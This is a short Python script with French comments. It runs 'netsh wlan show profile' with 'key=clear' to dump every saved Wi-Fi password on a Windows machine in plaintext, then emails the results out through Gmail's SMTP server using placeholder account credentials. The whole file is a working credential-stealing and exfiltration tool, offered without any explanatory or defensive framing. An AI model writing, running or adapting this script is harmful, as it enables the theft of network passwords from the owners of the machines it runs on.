#!usr/bin/python3

import subprocess, smtplib, re 
import time
from email.mime.text import MIMEText

my_email = "votre@mail.com"
password = "votre_mdp"

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True) #output de la commande, qui contient les noms des wireless outspots, type bytes
networks = networks.decode('cp850','replace') #type str
network_list = re.findall("(?:les\sutilisateurs\s*\s)(?:.:.)(.*)", networks) #voir redex internet

#print(network_list)

final_output = ""
for network in network_list:
	command2 = "netsh wlan show profile \"%s\" key=clear" % str(network) #commande pour voir mdp
	one_network_result = subprocess.check_output(command2, shell = True).decode('cp850','replace')
	final_output += one_network_result

#---------------------------SENDING MAIL---------------------------#
server = smtplib.SMTP("smtp.gmail.com", 587) #smtp address, port
server.starttls() #tls encryption
server.login(my_email,password) #email, password of our gmail account
msg = MIMEText(final_output, 'plain', 'utf-8')
msg['Subject'] = 'Wifi passwords'
server.sendmail(my_email, my_email, msg.as_string()) #src, dest, contenue
server.quit()
#------------------------------------------------------------------#

# print(type(final_output))
# file = open("wifipasswords.txt","w") #changer la destination pour plus tard, voire meme pas creer de fichier
# file.write(final_output)
# file.close()
